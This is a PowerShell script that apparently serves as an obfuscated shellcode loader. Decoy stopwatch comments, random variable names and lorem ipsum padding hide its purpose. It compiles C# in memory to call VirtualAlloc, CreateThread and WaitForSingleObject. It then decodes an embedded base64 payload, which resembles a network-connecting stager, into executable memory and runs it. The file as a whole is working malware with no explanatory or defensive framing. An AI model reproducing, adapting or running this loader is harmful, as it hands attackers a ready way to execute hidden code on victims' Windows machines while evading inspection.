################.  ###### ###  #

$fed = 0

#Stopwatch should be at 0 elapsed time.
#$stopWatch.Elapsed

#Time span should be set for 1 minute and 30 seconds.
#$timeSpan

#You can compare [TimeSpan] to [TimeSpan]!
#This will return true, as the stopwatch elapsed time of 0, is of course less than 1 minute and 30 seconds.
#$stopWatch.Elapsed -le $timeSpan

#And similarly you can check if your stopwatch elapsed time is greater than or equal to the specified time span, in this case it is not.
#$stopWatch.Elapsed -ge $timeSpan

$def = $fed

$xgh = $def

Set-StrictMode -Version 2

$dFMbF = @"
	using System;
	using System.Runtime.InteropServices;
	namespace uHU {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
"@

#Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non risus. Suspendisse lectus tortor, dignissim sit amet, adipiscing nec, ultricies sed, dolor. Cras elementum ultrices diam. Maecenas ligula massa, varius a, semper congue, euismod non, mi. Proin porttitor, orci nec nonummy molestie, enim est eleifend mi, non fermentum diam nisl sit amet erat. Duis semper. Duis arcu massa, scelerisque vitae, consequat in, pretium a, enim. Pellentesque congue. Ut in risus volutpat libero pharetra tempor. Cras vestibulum bibendum augue. Praesent egestas leo in pede. Praesent blandit odio eu enim. Pellentesque sed dui ut augue blandit sodales. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Aliquam nibh. Mauris ac mauris sed pede pellentesque fermentum. Maecenas adipiscing ante non diam sodales hendrerit.

$z1s = New-Object Microsoft.CSharp.CSharpCodeProvider

$ez = New-Object System.CodeDom.Compiler.CompilerParameters

$tata = "System.dll"
$ez.ReferencedAssemblies.AddRange(@($tata, [PsObject].Assembly.Location))

$ez.GenerateInMemory = $True

$bUDQ = $z1s.CompileAssemblyFromSource($ez, $dFMbF)

#Ut velit mauris, egestas sed, gravida nec, ornare ut, mi. Aenean ut orci vel massa suscipit pulvinar. Nulla sollicitudin. Fusce varius, ligula non tempus aliquam, nunc turpis ullamcorper nibh, in tempus sapien eros vitae ligula. Pellentesque rhoncus nunc et augue. Integer id felis. Curabitur aliquet pellentesque diam. Integer quis metus vitae elit lobortis egestas. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Morbi vel erat non mauris convallis vehicula. Nulla et sapien. Integer tortor tellus, aliquam faucibus, convallis id, congue eu, quam. Mauris ullamcorper felis vitae erat. Proin feugiat, augue non elementum posuere, metus purus iaculis lectus, et tristique ligula justo vitae magna.

[Byte[]]$aeT = [System.Convert]::FromBase64String("kPzoggAAAGCJ5THAZItQMItSDItSFItyKA+3SiYx/6w8YXwCLCDBzw0Bx+LyUleLUhCLSjyLTBF440gB0VGLWSAB04tJGOM6SYs0iwHWMf+swc8NAcc44HX2A334O30kdeRYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4F9fWosS641daDMyAABod3MyX1RoTHcmB4no/9C4kAEAACnEVFBoKYBrAP/Vagpoo6w9VmgCAAG7ieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04Idezo3AAAAGoAagRWV2gC2chf/9WD+AB+SYs2gfZZBXM4jY4AAQAAakBoABAAAFFqAGhYpFPl/9WNmAABAABTVlBqAFZTV2gC2chf/9WD+AB9KFhoAEAAAGoAUGgLLw8w/9VXaHVuTWH/1V5e/wwkD4Vd////6Yj///8BwynGdcFbWV1VV4nf6BAAAACCOs0aGswgq4dzrAMxmmGeXjHAqv7AdfuB7wABAAAx2wIcB4nCgOIPAhwWihQHhhQfiBQH/sB16DHb/sACHAeKFAeGFB+IFAcCFB+KFBcwVQBFSXXlX8O78LWiVmoAU//V")

#Aliquam convallis sollicitudin purus. Praesent aliquam, enim at fermentum mollis, ligula massa adipiscing nisl, ac euismod nibh nisl eu lectus. Fusce vulputate sem at sapien. Vivamus leo. Aliquam euismod libero eu enim. Nulla nec felis sed leo placerat imperdiet. Aenean suscipit nulla in justo. Suspendisse cursus rutrum augue. Nulla tincidunt tincidunt mi. Curabitur iaculis, lorem vel rhoncus faucibus, felis magna fermentum augue, et ultricies lacus lorem varius purus. Curabitur eu amet.
$vKc = [uHU.func]::VirtualAlloc(0, $aeT.Length + 1, [uHU.func+AllocationType]::Reserve -bOr [uHU.func+AllocationType]::Commit, [uHU.func+MemoryProtection]::ExecuteReadWrite)

if ([Bool]!$vKc) { $global:result = (2+1); return }

[System.Runtime.InteropServices.Marshal]::Copy($aeT, 0, $vKc, $aeT.Length)

[IntPtr] $fxY = [uHU.func]::CreateThread(0,0,$vKc,0,0,0)

if ([Bool]!$fxY) { $global:result = (6+1); return }

$jgv = [uHU.func]::WaitForSingleObject($fxY, [uHU.func+Time]::Infinite)